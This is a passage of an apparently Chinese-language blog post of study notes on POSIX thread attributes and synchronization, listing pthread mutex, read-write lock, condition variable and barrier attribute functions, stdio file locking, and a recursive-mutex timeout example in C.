failure</span><br></code></pre></td></tr></table></figure><p>设置与获取<code>guardsize</code>，<code>guardsize</code>用于设置保护缓存区大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_attr_getguardsize</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">pthread_attr_t</span> *<span class="hljs-keyword">restrict</span> attr,<span class="hljs-type">size_t</span> *<span class="hljs-keyword">restrict</span> guaradsize)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_attr_setguardsize</span><span class="hljs-params">(<span class="hljs-type">pthread_attr_t</span> *attr, <span class="hljs-type">size_t</span> guardsize)</span>;<br><span class="hljs-comment">//Both return:0 if OK,error number on failure</span><br></code></pre></td></tr></table></figure><h2 id="同步属性"><a href="#同步属性" class="headerlink" title="同步属性"></a>同步属性</h2><h3 id="锁属性"><a href="#锁属性" class="headerlink" title="锁属性"></a>锁属性</h3><p><strong>初始化锁属性</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_mutextattr_init</span><span class="hljs-params">(<span class="hljs-type">pthread_mutexattr_t</span> *attr)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_mutexattr_destroy</span><span class="hljs-params">(<span class="hljs-type">pthread_mutexattr_t</span> *attr)</span>;<br><span class="hljs-comment">//Both return:0 if OK, error number on failure</span><br></code></pre></td></tr></table></figure><p><strong>获取锁共享属性</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_mutexattr_getpshared</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">pthread_mutexattr_t</span> *</span><br><span class="hljs-params">                                 <span class="hljs-keyword">restrict</span> attr,</span><br><span class="hljs-params">                                 <span class="hljs-type">int</span> *<span class="hljs-keyword">restrict</span> pshared)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_mutexattr_setpshared</span><span class="hljs-params">(<span class="hljs-type">pthread_mutexattr_t</span> *attr,</span><br><span class="hljs-params">                                 <span class="hljs-type">int</span> pshared)</span>;<br><span class="hljs-comment">//Both return:0 if OK, error number on failure</span><br></code></pre></td></tr></table></figure><p><strong>获取健壮互斥体属性</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_mutexattr_getrobust</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">pthread_mutexattr_t</span> *</span><br><span class="hljs-params">                                 <span class="hljs-keyword">restrict</span> attr,</span><br><span class="hljs-params">                                <span class="hljs-type">int</span> *<span class="hljs-keyword">restrict</span> robust)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_mmutexattr_setrobust</span><span class="hljs-params">(<span class="hljs-type">pthread_mutexattr_t</span> *attr,</span><br><span class="hljs-params">                                <span class="hljs-type">int</span> robust)</span>;<br><span class="hljs-comment">//Both return: 0 if OK, error number in failure</span><br></code></pre></td></tr></table></figure><p><strong>保持互斥锁的状态</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span>c</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_mutex_consistent</span><span class="hljs-params">(<span class="hljs-type">pthread_mutex_t</span> * mutex)</span>;<br><span class="hljs-comment">//Reutns:0 if OK, error number on failure</span><br></code></pre></td></tr></table></figure><p><strong>mutex类型的可选值</strong></p><ul><li><code>PTHREAD_MUTEX_NORMAL</code>：标准互斥类型，不进行任何特殊的错误检查或死锁检测</li><li><code>PTHREAD_MUTEX_ERRORCHECK</code>：提供错误检查的互斥类型</li><li><code>PTHREAD_MUTEX_RECURSIVE</code>：一种互斥锁类型，允许同一线程在不首先解锁的情况下多次锁定它。递归互斥锁保持一个锁计数，直到它被锁定的次数相同时才被释放。因此，如果您锁定递归互斥锁两次，然后解锁它，则互斥锁将保持锁定状态，直到第二次解锁。</li><li><code>PTHREAD_MUTEX_DEFAULT</code>：提供默认特性和行为的互斥类型。实现可以自由地将其映射到其他互斥类型之一</li></ul><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230115180638406.png" alt="image-20230115180638406"></p><p><strong>获取与更改锁属性</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_mutexattr_gettype</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">pthread_mutexattr_t</span> *</span><br><span class="hljs-params">                             <span class="hljs-keyword">restrict</span> attr, <span class="hljs-type">int</span> *<span class="hljs-keyword">restrict</span> type)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_mutexattr_settype</span><span class="hljs-params">(<span class="hljs-type">pthread_mutexattr_t</span> *attr, <span class="hljs-type">int</span> type)</span>;<br><span class="hljs-comment">//Both return:0 if OK,error number on failure</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">makethread</span><span class="hljs-params">(<span class="hljs-type">void</span> *(*)(<span class="hljs-type">void</span> *), <span class="hljs-type">void</span> *)</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">to_info</span>&#123;</span><br>    <span class="hljs-type">void</span> (*to_fn)(<span class="hljs-type">void</span> *); <span class="hljs-comment">//函数指针</span><br>    <span class="hljs-type">void</span> *to_arg; <span class="hljs-comment">//函数的参数</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timespec</span> <span class="hljs-title">to_wait</span>;</span> <span class="hljs-comment">//等待时间</span><br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECTONSEC 1000000000</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> !defined(CLOCK_REALTIME) || defined(BSD)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> clock_nanosleep(ID, FL, REQ, REM) nanosleep((REQ), (REM))</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CLOCK_REALTIME</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CLOCK_REALTIME 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USECTONSEC 1000</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">clock_gettime</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-keyword">struct</span> timespec *tsp)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">tv</span>;</span><br><br>    gettimeofday(&amp;tv, <span class="hljs-literal">NULL</span>);<br>    tsp-&gt;tv_sec = tv.tv_sec;<br>    tsp-&gt;tv_nsec = tv.tv_usec * USECTONSEC;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">makethread</span><span class="hljs-params">(<span class="hljs-type">void</span> *(*fn)(<span class="hljs-type">void</span> *), <span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-type">int</span> err;<br>    <span class="hljs-type">pthread_t</span>  tid;<br>    <span class="hljs-type">pthread_attr_t</span> attr;<br><br>    err = pthread_attr_init(&amp;attr); <span class="hljs-comment">//初始化属性</span><br>    <span class="hljs-keyword">if</span> (err != <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>(err);<br>    err = pthread_attr_setdetachstate(&amp;attr, PTHREAD_CREATE_DETACHED); <span class="hljs-comment">//将线程的状态设置为分离</span><br>    <span class="hljs-keyword">if</span> (err == <span class="hljs-number">0</span>)<br>        err = pthread_create(&amp;tid, &amp;attr, fn, arg);<br>    pthread_attr_destroy(&amp;attr);<br>    <span class="hljs-keyword">return</span>(err);<br>&#125;<br><br><br><span class="hljs-type">void</span> *<br><span class="hljs-title function_">timeout_helper</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">to_info</span> *<span class="hljs-title">tip</span>;</span><br><br>    tip = (<span class="hljs-keyword">struct</span> to_info *)arg;<br>    clock_nanosleep(CLOCK_REALTIME, <span class="hljs-number">0</span>, &amp;tip-&gt;to_wait, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">//纳秒级别休眠</span><br>    (*tip-&gt;to_fn)(tip-&gt;to_arg);<br>    <span class="hljs-built_in">free</span>(arg);<br>    <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">timeout</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> timespec *when, <span class="hljs-type">void</span> (*func)(<span class="hljs-type">void</span> *), <span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timespec</span> <span class="hljs-title">now</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">to_info</span> *<span class="hljs-title">tip</span>;</span><br>    <span class="hljs-type">int</span> err;<br><br>    clock_gettime(CLOCK_REALTIME, &amp;now);<br>    <span class="hljs-keyword">if</span> ((when-&gt;tv_sec &gt; now.tv_sec) ||<br>    (when-&gt;tv_sec == now.tv_sec &amp;&amp; when-&gt;tv_nsec &gt; now.tv_nsec))&#123;<br>        tip = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> to_info));<br>        <span class="hljs-keyword">if</span> (tip != <span class="hljs-literal">NULL</span>)&#123;<br>            tip-&gt;to_fn = func;<br>            tip-&gt;to_arg = arg;<br>            tip-&gt;to_wait.tv_sec = when-&gt;tv_sec - now.tv_sec;<br>            <span class="hljs-keyword">if</span> (when-&gt;tv_nsec &gt;= now.tv_nsec)&#123;<br>                tip-&gt;to_wait.tv_nsec = when-&gt;tv_nsec - now.tv_nsec;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                tip-&gt;to_wait.tv_sec--;<br>                tip-&gt;to_wait.tv_nsec = SECTONSEC - now.tv_nsec + when-&gt;tv_nsec;<br>            &#125;<br>            err = makethread(timeout_helper, (<span class="hljs-type">void</span> *)tip);<br>            <span class="hljs-keyword">if</span> (err == <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span>;<br>            <span class="hljs-keyword">else</span><br>                <span class="hljs-built_in">free</span>(tip);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">pthread_mutexattr_t</span> attr;<br><span class="hljs-type">pthread_mutex_t</span> mutex;<br><br><span class="hljs-type">void</span> <br><span class="hljs-title function_">retry</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    pthread_mutex_lock(&amp;mutex);<br>    pthread_mutex_unlock(&amp;mutex);<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> err, condition, arg;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timespec</span> <span class="hljs-title">when</span>;</span><br><br>    <span class="hljs-keyword">if</span> ((err = pthread_mutexattr_init(&amp;attr)) != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;pthread_mutexattr_init failed&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((err = pthread_mutexattr_settype(&amp;attr, PTHREAD_MUTEX_RECURSIVE)) != <span class="hljs-number">0</span>) <span class="hljs-comment">//在同一个线程中可以多次获取同一把锁。并且不会死锁</span><br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can&#x27;t set recursive type&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((err = pthread_mutex_init(&amp;mutex, &amp;attr)) != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can&#x27;t create recursive mutex&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    pthread_mutex_lock(&amp;mutex);<br><br>    <span class="hljs-keyword">if</span> (condition) &#123;<br>        clock_gettime(CLOCK_REALTIME, &amp;when);<br>        when.tv_sec += <span class="hljs-number">10</span>;<br>        timeout(&amp;when, retry, (<span class="hljs-type">void</span> *)((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)arg));<br>    &#125;<br><br>    pthread_mutex_unlock(&amp;mutex);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="读写锁属性"><a href="#读写锁属性" class="headerlink" title="读写锁属性"></a>读写锁属性</h3><p><strong>读写锁属性初始化</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_rwlockattr_init</span><span class="hljs-params">(<span class="hljs-type">pthread_rwlockattr_t</span> *attr)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_rwlockattr_destroy</span><span class="hljs-params">(<span class="hljs-type">pthread_rwlockattr_t</span> *attr)</span>;<br><span class="hljs-comment">//Both return:0 if OK, error number on failure</span><br></code></pre></td></tr></table></figure><p><strong>获取读写锁共享属性</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_rwlockattr_getpshared</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">pthread_rwlockattr_t</span> *</span><br><span class="hljs-params">                                 <span class="hljs-keyword">restrict</span> attr,</span><br><span class="hljs-params">                                 <span class="hljs-type">int</span> *<span class="hljs-keyword">restrict</span> pshared)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_rwlockattr_setpshared</span><span class="hljs-params">(<span class="hljs-type">pthread_rwlockattr_t</span> *attr,</span><br><span class="hljs-params">                                 <span class="hljs-type">int</span> pshared)</span>;<br><span class="hljs-comment">//Both return:0 if OK, error number on failure</span><br></code></pre></td></tr></table></figure><h2 id="状态变量属性"><a href="#状态变量属性" class="headerlink" title="状态变量属性"></a>状态变量属性</h2><p><strong>状态变量属性初始化</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_condattr_init</span><span class="hljs-params">(<span class="hljs-type">pthread_condattr_t</span> *attr)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_condattr_destroy</span><span class="hljs-params">(<span class="hljs-type">pthread_condattr_t</span> *attr)</span>;<br><span class="hljs-comment">//Both return:0 if OK, error number on failure</span><br></code></pre></td></tr></table></figure><p><strong>共享属性</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_condattr_getpshared</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">pthread_condattr_t</span> *</span><br><span class="hljs-params">                               <span class="hljs-keyword">restrict</span> attr,</span><br><span class="hljs-params">                               <span class="hljs-type">int</span> *<span class="hljs-keyword">restrict</span> pshared)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_condattr_setpshared</span><span class="hljs-params">(<span class="hljs-type">pthread_condattr_t</span> *attr,</span><br><span class="hljs-params">                               <span class="hljs-type">int</span> pshared)</span>;<br><span class="hljs-comment">// Both return:0 if OK, error number on failure</span><br></code></pre></td></tr></table></figure><p><strong>获取时钟</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_condattr_getclock</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">pthread_condattr_t</span> *</span><br><span class="hljs-params">                             <span class="hljs-keyword">restrict</span> attr,</span><br><span class="hljs-params">                             <span class="hljs-type">clockid_t</span> *<span class="hljs-keyword">restrict</span> clock_id)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_condattr_setclock</span><span class="hljs-params">(<span class="hljs-type">pthread_condattr_t</span> *attr,</span><br><span class="hljs-params">                             <span class="hljs-type">clockid_t</span> clock_id)</span>;<br><span class="hljs-comment">//Both return:0 if OK, error number on failure</span><br></code></pre></td></tr></table></figure><h2 id="围栏属性"><a href="#围栏属性" class="headerlink" title="围栏属性"></a>围栏属性</h2><p><strong>初始化属性</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_barrierattr_init</span><span class="hljs-params">(<span class="hljs-type">pthread_barrierattr_t</span> *attr)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_barrierattr_destroy</span><span class="hljs-params">(<span class="hljs-type">pthread_barrierattr_t</span> *attr)</span>;<br><span class="hljs-comment">//Both return:0 if OK, error number on failure</span><br></code></pre></td></tr></table></figure><p><strong>获取共享属性</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_barrierattr_getpshared</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">pthread_barrierattr_t</span> *</span><br><span class="hljs-params">                                  <span class="hljs-keyword">restrict</span> aattr,</span><br><span class="hljs-params">                                  <span class="hljs-type">int</span> *reestrict pshared)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_barrierattr_setpshared</span><span class="hljs-params">(<span class="hljs-type">pthread_barrierattr_t</span> *attr,</span><br><span class="hljs-params">                                  <span class="hljs-type">int</span> pshared)</span>;<br><span class="hljs-comment">//Both return:0 if OK,error number on failure</span><br></code></pre></td></tr></table></figure><h2 id="flockfile和ftrylockfile"><a href="#flockfile和ftrylockfile" class="headerlink" title="flockfile和ftrylockfile"></a>flockfile和ftrylockfile</h2><p>线程安全方式管理<code>FILE</code>对象的方法，<code>flockfile</code>和<code>ftrylockfile</code>用于获取与给定<code>FILE</code>对象关联的锁</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">ftrylockfile</span><span class="hljs-params">(FILE *fp)</span>;<br><span class="hljs-comment">//Returns:0 if OK, nonzero if lock can&#x27;t be acquired</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">flockfile</span><span class="hljs-params">(FILE *fp)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">funlockfile</span><span class="hljs-params">(FILE *fp)</span>;<br></code></pre></td></tr></table></figure><h2 id="字符锁"><a href="#字符锁" class="headerlink" title="字符锁"></a>字符锁</h2><p>基于字符的标准<code>I/O</code>例程的锁</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">getchar_unlocked</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">getc_unlocked</span><span class="hljs-params">(FIILE *fp)</span>;<br><span class="hljs-comment">//Both return:the next character if OK,EOF on end of file or error</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">putchar_unlocked</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">putc_unlocked</span><span class="hljs-params">(<span class="hljs-type">int</span> c, FILE *fp)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> **environ;<br><span class="hljs-type">pthread_mutex_t</span> env_mutex;<br><span class="hljs-type">static</span> <span class="hljs-type">phtread_once_t</span> init_done = PTHREAD_ONCE_INIT;<br><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <br><span class="hljs-title function_">thread_init</span><span class="hljs-params">(<span 